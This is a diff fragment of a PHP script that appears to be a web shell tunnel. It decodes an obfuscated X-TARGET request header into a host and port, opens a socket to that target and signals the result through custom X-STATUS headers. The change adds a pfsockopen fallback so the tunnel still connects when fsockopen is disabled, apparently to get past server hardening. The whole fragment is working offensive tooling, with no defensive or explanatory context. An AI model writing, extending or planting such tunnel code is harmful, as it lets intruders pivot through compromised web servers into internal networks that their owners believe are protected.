@@ -47,7 +47,11 @@ switch($cmd){
             $target_ary = explode("|", base64_decode(strtr($headers["X-TARGET"], $de, $en)));
             $target = $target_ary[0];
             $port = (int)$target_ary[1];
-            $res = fsockopen($target, $port, $errno, $errstr, 1);
+            if (is_callable('fsockopen')) {
+                $res = fsockopen($target, $port, $errno, $errstr, 1);
+            } else {
+                $res = pfsockopen($target, $port, $errno, $errstr, 1);
+            }
             if ($res === false)
             {
                 header('X-STATUS: FAIL');
